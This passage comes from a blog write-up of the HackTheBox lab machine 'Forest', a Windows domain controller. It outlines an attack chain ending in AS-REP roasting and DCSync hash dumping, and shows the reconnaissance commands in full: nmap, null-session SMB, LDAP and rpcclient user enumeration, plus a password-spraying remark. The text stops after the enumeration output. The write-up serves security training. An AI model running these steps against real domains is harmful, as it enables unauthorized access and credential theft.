<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox - Forest | amirr0r</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox - Forest" /><meta name="author" content="amirr0r" /><meta property="og:locale" content="en_US" /><meta name="description" content="Forest is an easy HackTheBox virtual machine acting as a Windows Domain Controller (DC) in which Exchange Server has been installed." /><meta property="og:description" content="Forest is an easy HackTheBox virtual machine acting as a Windows Domain Controller (DC) in which Exchange Server has been installed." /><link rel="canonical" href="https://amirr0r.github.io/posts/htb-forest/" /><meta property="og:url" content="https://amirr0r.github.io/posts/htb-forest/" /><meta property="og:site_name" content="amirr0r" /><meta property="og:image" content="https://amirr0r.github.io/assets/img/htb/machines/windows/easy/forest/Forest.jpg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-06T19:47:54+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://amirr0r.github.io/assets/img/htb/machines/windows/easy/forest/Forest.jpg" /><meta property="twitter:title" content="HackTheBox - Forest" /><meta name="twitter:site" content="@amirr0r_" /><meta name="twitter:creator" content="@amirr0r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Forest is an easy HackTheBox virtual machine acting as a Windows Domain Controller (DC) in which Exchange Server has been installed.","headline":"HackTheBox - Forest","dateModified":"2021-09-06T19:47:54+02:00","datePublished":"2021-09-06T19:47:54+02:00","@type":"BlogPosting","image":"https://amirr0r.github.io/assets/img/htb/machines/windows/easy/forest/Forest.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"https://amirr0r.github.io/posts/htb-forest/"},"url":"https://amirr0r.github.io/posts/htb-forest/","author":{"@type":"Person","name":"amirr0r"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">amirr0r</a></div><div class="site-subtitle font-italic"></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/amirr0r" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/amirr0r_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/amir-barnat/?locale=en_US" target="_blank"> <i class="fab fa-linkedin-in"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Forest</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 6, 2021, 7:47 PM +0200" > Sep 6, 2021 <i class="unloaded">2021-09-06T19:47:54+02:00</i> </span> by <span class="author"> amirr0r </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 26, 2022, 3:28 PM +0100" > Feb 26 <i class="unloaded">2022-02-26T15:28:38+01:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/Forest.jpg" class="post-preview-img"><p><strong>Forest</strong> is an easy <a href="https://www.hackthebox.eu/">HackTheBox</a> virtual machine acting as a <strong>Windows Domain Controller</strong> (DC) in which <code class="language-plaintext highlighter-rouge">Exchange Server</code> has been installed.</p><p><strong>Anonymous LDAP binds</strong> are allowed, which we will use to enumerate domain objects. We will also take advantage of null authentication enabled with <code class="language-plaintext highlighter-rouge">rpcclient</code> to enumerate usernames.</p><p>It turns out that a specific service (<code class="language-plaintext highlighter-rouge">Alfresco</code>) that <strong>do not require Kerberos preauthentication</strong> is installed, which leads us to discover an <strong>as-rep roastable</strong> account. We will dump its password hash and crack it with <code class="language-plaintext highlighter-rouge">john</code> to gain a foothold.</p><p>The compromised service account is found to be a member of the <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators">Account Operators group</a>, which can be used to add users to privileged <strong>Exchange Windows Permissions</strong> group.</p><p>Finally, the Exchange group membership is leveraged to gain <strong>DCSync</strong> privileges on the domain and dump all password hashes.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan"><code class="language-plaintext highlighter-rouge">nmap</code> scan</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-min-rate</span> 5000 <span class="nt">--max-retries</span> 1 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oN</span> Forest-full-port-scan.txt 10.10.10.161
Warning: 10.10.10.161 giving up on port because retransmission cap hit <span class="o">(</span>1<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.10.161
Host is up <span class="o">(</span>0.097s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 61414 closed ports, 4098 filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-08-15 18:58:09Z<span class="o">)</span>
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h30m07s, deviation: 4h02m30s, median: 10m06s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
|   Computer name: FOREST
|   NetBIOS computer name: FOREST<span class="se">\x</span>00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System <span class="nb">time</span>: 2021-08-15T12:00:29-07:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2021-08-15T19:00:31
|_  start_date: 2021-08-15T18:54:53
</pre></table></code></div></div><p>The port 53 (DNS) is open which certainly means that we’re facing an Active Directory.</p><h3 id="smb-port-139--445">SMB (port 139 &amp; 445)</h3><p>According to <code class="language-plaintext highlighter-rouge">smbclient</code>, we couldn’t find accessible shares:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ smbclient -L \\$TARGET
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</pre></table></code></div></div><p>With <code class="language-plaintext highlighter-rouge">crackmapexec</code> using a <strong>null authentication</strong>, we can look at the password policy:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>crackmapexec smb <span class="nv">$TARGET</span> <span class="nt">--pass-pol</span> <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/crackmapexec.png" alt="" /></p><blockquote><p>The <strong>Account Lockout Threshold</strong> is set to None so we could perform a <strong>password spraying</strong> attack.</p></blockquote><h3 id="port-389-ldap">Port 389 (LDAP)</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-h</span> 10.10.10.161 <span class="nt">-x</span> <span class="nt">-s</span> base namingcontexts | <span class="nb">tee </span>services/ldap_search_namingcontexts.txt
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;&gt; (default) with scope baseObject</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: namingcontexts </span>
<span class="c">#</span>

<span class="c">#</span>
dn:
namingContexts: <span class="nv">DC</span><span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local
</span>namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local
</span>namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local
</span>namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local
</span>namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local</span>

<span class="c"># search result</span>
search: 2
result: 0 Success

<span class="c"># numResponses: 2</span>
<span class="c"># numEntries: 1</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$TARGET</span><span class="s2">  htb.local"</span> <span class="o">&gt;&gt;</span> /etc/hosts <span class="c"># adding domain controller to hosts</span>
<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> <span class="nv">$TARGET</span> <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=htb,DC=local"</span> <span class="o">&gt;</span> services/anon_ldap.txt 
</pre></table></code></div></div><blockquote><p><strong>Note</strong>: the tool <a href="https://github.com/ropnop/windapsearch"><code class="language-plaintext highlighter-rouge">windapsearch</code></a> could also be used to query the domain further.</p></blockquote><h3 id="port-135-rpc">Port 135 (RPC)</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'%'</span> 10.10.10.161
rpcclient <span class="nv">$&gt;</span> srvinfo
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient <span class="nv">$&gt;</span> enumdomusers <span class="c"># display a list of users names defined on the server</span>
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[<span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span><span class="o">]</span> rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient <span class="nv">$&gt;</span> getdompwinfo <span class="c"># get SMB password policy</span>
min_password_length: 7
password_properties: 0x00000000
rpcclient <span class="nv">$&gt;</span> querydispinfo <span class="c"># get users info</span>
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: <span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span>  Name: <span class="o">(</span>null<span class="o">)</span>    Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator  Name: Administrator     Desc: Built-in account <span class="k">for </span>administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: <span class="o">(</span>null<span class="o">)</span>    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: <span class="o">(</span>null<span class="o">)</span>    Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: <span class="o">(</span>null<span class="o">)</span>    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox<span class="o">{</span>8cc370d3-822a-4ab8-a926-bb94bd0641a9<span class="o">}</span>       Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: <span class="o">(</span>null<span class="o">)</span>
rpcclient <span class="nv">$&gt;</span>
